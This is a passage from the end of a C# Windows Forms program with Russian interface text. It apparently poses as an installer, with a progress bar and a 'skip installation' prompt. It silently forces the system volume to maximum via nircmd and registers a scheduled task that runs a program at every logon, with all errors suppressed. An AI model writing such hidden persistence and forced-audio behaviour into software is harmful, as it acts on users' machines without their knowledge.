                Process.Start("nircmd.exe", "mutesysvolume 0");
                Process.Start("nircmd.exe", "setsysvolume 65535");
            }
            catch { }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("Вы хотите пропустить этап установки?", "Пропуск", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                progressBar1.Value = 99;
            }
        }

        private static void CreateTask(string path, string name, string desc)
        {
            using (TaskService ts = new TaskService())
            {
                try
                {
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = desc;
                    td.Triggers.Add(new LogonTrigger { });
                    td.Actions.Add(new ExecAction(path, "", null));
                    ts.RootFolder.RegisterTaskDefinition(name, td);
                }
                catch { }
            }
        }
    }
}
